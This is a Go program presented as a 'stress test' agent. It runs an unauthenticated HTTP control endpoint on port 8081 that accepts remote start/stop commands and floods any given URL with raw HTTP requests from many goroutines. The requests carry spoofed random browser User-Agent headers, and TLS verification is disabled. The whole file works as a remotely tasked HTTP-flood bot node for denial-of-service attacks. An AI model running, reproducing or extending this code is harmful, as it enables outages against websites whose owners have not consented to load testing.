package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"time"
)

type Command struct {
	Action  string `json:"action"`
	URL     string `json:"url"`
	Threads int    `json:"threads"`
	Timer   int    `json:"timer"`
	Cookie  string `json:"cookie"`
}

var (
	ip      string
	port    int
	path    string
	cookie  string
	mu      sync.Mutex
	cancel  context.CancelFunc // Used to cancel the active test
	active  bool
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getUserAgent() string {
	platform := []string{"Macintosh", "Windows", "X11"}[rand.Intn(3)]
	var os string
	if platform == "Macintosh" {
		os = []string{"68K", "PPC", "Intel Mac OS X"}[rand.Intn(3)]
	} else if platform == "Windows" {
		os = []string{"WinNT4.0", "Windows NT 5.1", "Windows XP", "Windows NT 10.0; Win64; x64"}[rand.Intn(4)]
	} else {
		os = []string{"Linux i686", "Linux x86_64"}[rand.Intn(2)]
	}
	browser := []string{"chrome", "firefox", "edge", "safari"}[rand.Intn(4)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
	}
	return "Mozilla/5.0 (compatible)"
}

func getHeader() string {
	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
	header += fmt.Sprintf("Host: %s\r\n", ip)
	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	header += "Connection: keep-alive\r\n\r\n"
	return header
}

func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan int) {
	defer wg.Done()

	address := fmt.Sprintf("%s:%d", ip, port)

	tlsConfig := &tls.Config{InsecureSkipVerify: true} // Moved here for HTTPS

	for {
		select {
		case <-ctx.Done(): // Stop signal
			fmt.Printf("Worker %d stopping\n", id)
			return
		case count, ok := <-requestCount:
			if !ok {
				return
			}
			var conn net.Conn
			var err error

			// Use TLS for HTTPS connections
			if port == 443 {
				conn, err = tls.Dial("tcp", address, tlsConfig)
			} else {
				conn, err = net.Dial("tcp", address)
			}

			if err != nil {
				fmt.Printf("Worker %d: connection error: %v\n", id, err)
				continue
			}

			header := getHeader()
			for i := 0; i < count; i++ {
				_, err := conn.Write([]byte(header))
				if err != nil {
					fmt.Printf("Worker %d: write error: %v\n", id, err)
					break
				}
			}
			conn.Close()
		}
	}
}


func startTest(ctx context.Context, urlStr string, threads, timer int, cookieStr string) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}
	ip = parsedURL.Hostname()
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	} else {
		port = 80
	}
	path = parsedURL.Path
	if path == "" {
		path = "/"
	}
	cookie = cookieStr

	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)

	var wg sync.WaitGroup
	requestCount := make(chan int, threads)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(ctx, i, &wg, requestCount)
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for t := 0; t < timer; t++ {
			select {
			case <-ctx.Done():
				close(requestCount)
				return
			case <-ticker.C:
				for i := 0; i < threads; i++ {
					requestCount <- rand.Intn(50) + 1
				}
			}
		}
		close(requestCount)
	}()
	wg.Wait()
	fmt.Println("Stress test completed.")
}

func controlHandler(w http.ResponseWriter, r *http.Request) {
	var cmd Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "Invalid command format", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	if cmd.Action == "start" && !active {
		ctx, cancelFunc := context.WithCancel(context.Background())
		cancel = cancelFunc
		active = true
		go func() {
			startTest(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
			mu.Lock()
			active = false
			mu.Unlock()
		}()
		w.Write([]byte("Stress test started"))
	} else if cmd.Action == "stop" && active {
		cancel()
		w.Write([]byte("Stress test stopping"))
	} else {
		w.Write([]byte("Invalid or conflicting command"))
	}
}

func main() {
	http.HandleFunc("/control", controlHandler)
	fmt.Println("Agent server is running on port 8081")
	err := http.ListenAndServe(":8081", nil)
	if err != nil {
		fmt.Printf("Server error: %v\n", err)
	}
}
